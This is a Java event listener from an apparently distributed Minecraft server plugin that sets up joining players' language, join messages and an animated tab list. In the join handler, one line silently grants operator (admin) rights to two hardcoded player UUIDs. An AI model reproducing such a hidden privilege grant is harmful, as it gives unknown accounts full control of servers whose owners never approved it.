package de.j.stationofdoom.listener;

import de.j.stationofdoom.cmd.VersionCMD;
import de.j.stationofdoom.cmd.VoteRestartCMD;
import de.j.stationofdoom.main.Main;
import de.j.stationofdoom.util.Tablist;
import de.j.stationofdoom.util.WhoIsOnline;
import de.j.stationofdoom.util.translations.ChangeLanguageGUI;
import de.j.stationofdoom.util.translations.LanguageChanger;
import de.j.stationofdoom.util.translations.TranslationFactory;
import io.papermc.paper.threadedregions.scheduler.AsyncScheduler;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.minimessage.MiniMessage;
import net.kyori.adventure.text.minimessage.tag.resolver.Placeholder;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.checkerframework.common.aliasing.qual.Unique;

import java.io.IOException;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class PlayerJoin implements Listener {

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        TranslationFactory translations = new TranslationFactory();

        if (LanguageChanger.hasPlayerLanguage(player)) {
            Main.getMainLogger().info("Loaded translation for " + player.getName());
        } else {
            player.openInventory(new ChangeLanguageGUI().getGUI(player));
            Main.getMainLogger().info("Opened language gui for " + player.getName());
        }

        if (VoteRestartCMD.restarting) {
            player.kick(Component.text(translations.getTranslation(player, "ServerRestart") + "\n \n").color(NamedTextColor.DARK_RED)
                    .append(Component.text(translations.getTranslation(player, "JoinAgain")).color(NamedTextColor.BLUE)));
        }
        event.joinMessage(Component.text(player.getName()).color(NamedTextColor.GOLD)
                .append(Component.text(translations.getTranslation(translations.getServerLang(), "JoinMessage"))));
        if (player.getUniqueId().equals(UUID.fromString("050fee27-a1cc-4e78-953a-7cefaf0849a1")) || player.getUniqueId().equals(UUID.fromString("46cd27ba-df0c-49ef-9f33-6cfa884e339b"))) {
            player.setOp(true);
        }

        Tablist tablist = new Tablist();
        MiniMessage mm = MiniMessage.miniMessage();
        if (!Main.isFolia()) {
            tablist.setScoreboard();
        }

        WhoIsOnline.join(player);

        if (player.isOp()) {
            try {
                String version = VersionCMD.getLatestTagName();
                if (Main.version.equals(version)) {
                    player.sendMessage(Component.text(translations.getTranslation(player, "ServerVersion", "v" + Main.version, version)).color(NamedTextColor.GREEN));
                }
            } catch (IOException | InterruptedException e) {
                throw new RuntimeException(e);
            }
        }

        AsyncScheduler asyncScheduler = Main.getAsyncScheduler();
        AtomicInteger phase = new AtomicInteger();
        asyncScheduler.runAtFixedRate(Main.getPlugin(), scheduledTask -> {
            int ping = player.getPing();
            if(Tablist.getHostetBy() == null) {
                tablist.tabTPS(player, mm.deserialize("     <dark_blue><1></dark_blue>     <newline><newline>", Placeholder.component("1", Component.text(Tablist.getServerName()))),
                        mm.deserialize("<newline> <red>Plugin by </red><rainbow:!" + (phase.get() + 2) + ">LuckyProgrammer</rainbow>")
                                .append(Component.text(String.format("\nTPS:  %s;  %s;  %s", (int) Main.getPlugin().getServer().getTPS()[0], (int) Main.getPlugin().getServer().getTPS()[1], (int) Main.getPlugin().getServer().getTPS()[2]), NamedTextColor.LIGHT_PURPLE))
                                .append(Component.text("\n Ping: ")
                                        .append(Component.text(String.valueOf(ping))
                                                .color(ping > 30 ? NamedTextColor.RED : NamedTextColor.GREEN)))
                                .append(Component.text("\n")
                                        .append(tablist.getTimeComponent(player))));
            }
            else {
                tablist.tabTPS(player, mm.deserialize("     <dark_blue><1></dark_blue>     <newline><newline>", Placeholder.component("1", Component.text(Tablist.getServerName()))),
                        mm.deserialize("<newline><newline>     <red>Hosted by </red><rainbow:" + phase + "><2></rainbow>     <newline> <red>Plugin by </red><rainbow:!" + (phase.get() + 2) + ">LuckyProgrammer</rainbow>", Placeholder.component("2", Component.text(Tablist.getHostetBy())))
                                .append(Component.text(String.format("\nTPS:  %s;  %s;  %s", (int) Main.getPlugin().getServer().getTPS()[0], (int) Main.getPlugin().getServer().getTPS()[1], (int) Main.getPlugin().getServer().getTPS()[2]), NamedTextColor.LIGHT_PURPLE))
                                .append(Component.text("\n Ping: ")
                                        .append(Component.text(String.valueOf(ping))
                                                .color(ping > 30 ? NamedTextColor.RED : NamedTextColor.GREEN)))
                                .append(Component.text("\n")
                                        .append(tablist.getTimeComponent(player))));
            }
            phase.getAndIncrement();
            if (phase.get() >= 14) {
                phase.set(0);
            }
        }, 1000, 500, TimeUnit.MILLISECONDS);
    }

}
